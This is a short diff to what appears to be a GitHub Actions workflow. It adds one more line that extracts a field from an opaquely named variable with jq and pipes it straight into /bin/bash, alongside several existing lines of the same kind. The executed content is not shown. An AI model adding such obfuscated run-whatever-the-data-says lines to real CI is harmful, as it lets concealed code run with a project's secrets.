@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$j33586" | jq -r .bubcx625 | /bin/bash
           printf '%s' "$ufs286" | jq -r .sx1 | /bin/bash
           printf '%s' "$k87851" | jq -r .cl5760 | /bin/bash
+          echo $if1 | jq -r .zrv542 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
